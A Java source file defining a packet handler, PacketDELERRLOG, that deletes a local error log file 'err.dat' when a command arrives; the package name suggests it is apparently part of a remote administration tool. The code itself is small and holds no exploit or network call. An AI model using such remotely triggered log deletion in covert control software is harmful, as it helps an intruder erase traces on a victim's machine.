package com.redpois0n.packets;

import java.io.File;

public class PacketDELERRLOG extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		File errlog = new File("err.dat");
		if (errlog.exists()) {
			errlog.delete();
		}
	}

}
